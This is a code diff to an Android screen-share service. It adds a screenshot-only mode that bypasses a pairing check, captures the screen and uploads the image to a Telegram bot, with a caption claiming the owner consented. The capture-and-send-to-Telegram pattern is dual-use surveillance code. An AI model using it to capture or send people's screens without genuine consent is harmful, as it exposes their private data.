@@ -18,6 +18,8 @@ import android.util.DisplayMetrics
 import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.util.Base64
@@ -30,10 +32,13 @@ class ScreenShareService : Service() {
         const val ACTION_STOP = "com.manw.autosender.SCREEN_STOP"
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_RESULT_DATA = "result_data"
+        const val EXTRA_SCREENSHOT_ONLY = "screenshot_only"
         private const val CHANNEL = "manw_screen_share"
         private const val NOTIFICATION_ID = 3180
     }
     private var projection: MediaProjection? = null
+    private var screenshotOnly = false
+    private val screenshotSent = AtomicBoolean(false)
     private var display: VirtualDisplay? = null
     private var reader: ImageReader? = null
     private var socket: WebSocket? = null
@@ -64,7 +69,8 @@ class ScreenShareService : Service() {
         if (intent?.action == ACTION_STOP) { stopCapture(); stopSelf(); return START_NOT_STICKY }
         if (intent?.action != ACTION_START) { stopSelf(); return START_NOT_STICKY }
         val prefs = SecurePrefs.get(this)
-        if (!prefs.getBoolean("web_paired", false)) { stopSelf(); return START_NOT_STICKY }
+        screenshotOnly = intent.getBooleanExtra(EXTRA_SCREENSHOT_ONLY, false)
+        if (!screenshotOnly && !prefs.getBoolean("web_paired", false)) { stopSelf(); return START_NOT_STICKY }
         val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
         val data = if (Build.VERSION.SDK_INT >= 33) intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
                    else @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
@@ -110,7 +116,10 @@ class ScreenShareService : Service() {
                 val out = ByteArrayOutputStream()
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 55, out)
                 bitmap.recycle()
-                sendFrame(out.toByteArray())
+                if (screenshotOnly && screenshotSent.compareAndSet(false, true)) {
+                    uploadScreenshot(out.toByteArray())
+                    Handler(mainLooper).post { stopCapture(); stopSelf() }
+                } else if (!screenshotOnly) sendFrame(out.toByteArray())
             } catch (_: Exception) {
                 sending.set(false)
             } finally { image.close() }
@@ -119,7 +128,7 @@ class ScreenShareService : Service() {
             "MANW-Visible-Screen-Share", width, height, density,
             DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader?.surface, null, handler
         )
-        connectSocket()
+        if (!screenshotOnly) connectSocket()
     }
 
     private fun connectSocket() {
@@ -172,6 +181,36 @@ class ScreenShareService : Service() {
             socket = null
         }
         sending.set(false)
+    }
+
+    private fun uploadScreenshot(bytes: ByteArray) {
+        Thread {
+            try {
+                val prefs = SecurePrefs.get(this)
+                val token = prefs.getString("bot_token", "").orEmpty()
+                val chat = prefs.getString("chat_id", "").orEmpty()
+                if (token.isBlank() || chat.isBlank()) throw IllegalStateException("إعدادات تيليجرام غير مكتملة")
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chat)
+                    .addFormDataPart("caption", "لقطة شاشة MANW — بموافقة صاحب الهاتف")
+                    .addFormDataPart("photo", "MANW-SCREENSHOT.jpg", bytes.toRequestBody("image/jpeg".toMediaType()))
+                    .build()
+                val request = Request.Builder().url("https://api.telegram.org/bot$token/sendPhoto").post(body).build()
+                client.newCall(request).execute().use { response -> sendBot(if (response.isSuccessful) "تم إرسال لقطة الشاشة." else "فشل إرسال لقطة الشاشة (HTTP ${response.code}).") }
+            } catch (e: Exception) { sendBot("تعذر إرسال لقطة الشاشة: ${e.message}") }
+        }.start()
+    }
+
+    private fun sendBot(message: String) {
+        try {
+            val prefs = SecurePrefs.get(this)
+            val token = prefs.getString("bot_token", "").orEmpty()
+            val chat = prefs.getString("chat_id", "").orEmpty()
+            if (token.isBlank() || chat.isBlank()) return
+            val body = FormBody.Builder().add("chat_id", chat).add("text", message).build()
+            val request = Request.Builder().url("https://api.telegram.org/bot$token/sendMessage").post(body).build()
+            client.newCall(request).execute().close()
+        } catch (_: Exception) { }
     }
 
     private fun stopCapture() {
